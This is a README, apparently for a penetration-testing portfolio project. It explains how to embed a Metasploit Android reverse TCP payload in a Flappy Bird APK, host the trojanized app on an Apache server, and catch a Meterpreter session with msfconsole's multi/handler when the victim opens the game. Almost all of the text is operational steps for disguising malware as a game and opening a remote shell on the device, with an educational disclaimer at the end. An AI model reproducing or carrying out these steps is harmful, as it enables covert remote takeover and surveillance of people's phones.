# Flappy-Bird-or-Malware


# Overview
This project demonstrates my ability to modify APK files and create payloads for penetration testing purposes. The Flappy Bird APK has been modified to include a reverse TCP payload, showcasing my skills in reverse engineering and malware analysis.

# Requirements
Android Virtual Machine or Android Device: For running the modified APK.
Linux Machine: For creating the payload and setting up the listener.
APK File: The latest version of Flappy Bird APK.
Setup Instructions
Prepare the Environment

Ensure you have an Android Virtual Machine or a physical Android device.
Download the latest version of the Flappy Bird APK file and place it in a directory on your Linux machine.
Create the Payload

Open the terminal and navigate to the directory where the APK file is saved.

Execute the payload creation commands as outlined in the flappybird.txt file. Ensure you have root access.

# If errors occur during payload creation, follow these troubleshooting steps:

Reinstall apktool: 
Follow the steps from the APKTool Installation Guide: https://apktool.org/docs/install/

Install zipalign:
sudo apt-get install zipalign

# Deploy the Payload

Move the generated payload to the /var/www/html directory:
mv your_payload_file.apk /var/www/html/

# Start Apache2 to host the payload:
service apache2 start

# Set Up Metasploit Listener

Open msfconsole and configure the listener:

msfconsole
use exploit/multi/handler

set payload android/meterpreter/reverse_tcp

set LHOST your_linux_machine_ip

set LPORT your_chosen_port

Once setup, run the listenr.

# Download Flappy bird

Download the Flappy bird game from the website on your Android Virtual Machine or Android Device.
Once downloaded open the game, A Meterpreter session should initiate on your Linux machine upon opening the app.

# Skills Demonstrated
APK Modification: Embedding a payload into an APK file.
Payload Creation: Using msfvenom and apktool.
Metasploit Framework: Configuring a reverse TCP listener and managing Meterpreter sessions.
Web Server Configuration: Deploying files with Apache2.

# Note
This project is intended to showcase my technical skills in ethical hacking and penetration testing. Techniques used are for educational purposes and to demonstrate my capabilities to potential employers.
